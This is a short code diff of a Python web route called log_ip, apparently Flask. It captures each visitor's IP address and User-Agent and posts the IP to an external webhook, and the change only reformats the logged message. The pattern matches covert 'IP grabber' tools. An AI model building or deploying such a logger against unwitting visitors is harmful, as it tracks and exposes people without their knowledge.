@@ -25,7 +25,9 @@ def log_ip():
         ip = request.remote_addr
     
     user_agent = request.headers.get('User-Agent')
-    data = {"content": f"**IP-LOG:** {ip} 
+    data = {
+    "content": f"🌍 **IP:** `{ip}`"
+}
     
     try:
         r = requests.post(WEBHOOK_URL, json=data, timeout=10)
